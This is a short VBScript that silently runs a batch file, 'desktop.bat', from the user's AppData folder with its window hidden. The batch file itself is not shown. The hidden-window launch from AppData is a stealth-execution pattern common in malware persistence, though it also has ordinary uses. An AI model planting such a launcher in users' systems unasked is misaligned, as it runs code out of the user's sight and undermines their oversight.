Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%userprofile%\AppData\desktop.bat" & Chr(34), 0
Set WshShell = Nothing
